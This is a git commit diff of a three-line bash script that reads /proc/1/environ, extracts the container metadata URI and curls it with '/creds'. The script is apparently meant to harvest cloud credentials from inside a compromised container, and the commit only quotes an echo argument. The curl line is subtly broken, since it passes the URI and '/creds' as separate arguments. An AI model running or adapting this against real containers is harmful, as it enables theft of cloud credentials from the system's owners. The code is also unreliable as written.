5b11d935de6097b91ef3b6d1f4623619231e7a75
w2h3 <118594933+w2h3@users.noreply.github.com>
2023-03-11 16:23:01 +0800

    Update 1.sh

--- 1.sh
+++ 1.sh
@@ -1,5 +1,5 @@
 #!/bin/bash
 
 string=$(cat /proc/1/environ | sed -n 's/^.*ECS_CONTAINER_METADATA_URI_V4=\(.*\)FLUENT_PORT=.*$/\1/p')
-echo $string "/creds"
+echo "$string" "/creds"
 curl $string "/creds"
